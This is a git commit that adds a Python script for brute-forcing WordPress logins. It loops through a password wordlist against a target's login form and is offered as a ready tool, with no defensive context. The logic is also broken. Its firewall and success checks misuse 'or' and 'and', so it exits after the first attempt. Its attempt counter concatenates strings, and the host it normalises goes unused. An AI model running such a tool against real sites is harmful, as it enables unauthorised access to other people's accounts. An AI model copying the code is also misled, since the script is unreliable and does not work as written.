046420b3e2d635d9e79a4cd01184758e7c0b7a69
Hasher2009 <adarshpillai2009@yahoo.com>
2021-04-30 14:54:03 +0530

    Added Universal WordPress Login Bruteforce Script

---
+++ Python/WpBuster.py
@@ -0,0 +1,59 @@
+import sys
+import requests
+import threading
+
+pwd = "0"
+number = str(0)
+
+if len(sys.argv) not in [4]:
+    print('[*] Usage: python wpbruter.py <target> <username> <wordlist>\n')
+    sys.exit(1)
+
+if sys.argv[1][:7] != 'http://':
+    host = 'http://' + sys.argv[1]
+else:
+    host = sys.argv[1]
+
+print ('[*] BruteForcing:', host)
+print ('[*] Username:', sys.argv[2])
+
+try:
+    passwords = [x.strip() for x in open(sys.argv[3], 'r', encoding='utf-8').readlines() if x]
+    print ('[*] Total Passwords Loaded:', len(passwords), '\n')
+
+except IOError:
+    print('[-] Error: Wordlist Not Found\n')
+    sys.exit(1)
+
+def Brute(target, wlist):
+    s = requests.Session()
+    for password in passwords:
+        fodata = {'log': sys.argv[2],'pwd': password}
+        response = s.post(target, data=fodata)
+        global number
+        number += str(1)
+        print("[*] Trying Password#" + number + ": " + password)
+
+        if "The firewall on this server is blocking your connection" or "firewall" or "block" or "blocked" or "robot" or "unauthorised" in response.text:
+            print("[-] The Firewall Blocked Your IP")
+            sys.exit(0)
+
+        if "The password you entered for the username" and "firewall" and "block" and "blocked" and "robot" and "unauthorised" and "The firewall on this server is blocking your connection" not in response.text:
+            print()
+            print('[+] Password Found: '+ password)
+            pwd = "1"
+            sys.exit(0)
+    
+try:
+    thread = threading.Thread(target = Brute, args = (sys.argv[1], sys.argv[3],))
+    thread.start()
+    thread.join()
+
+except KeyboardInterrupt:
+    print("[-] Aborted")
+    sys.exit(0)
+
+
+if pwd == "0":
+    print("[-] Password Not Found")
+    sys.exit(0)
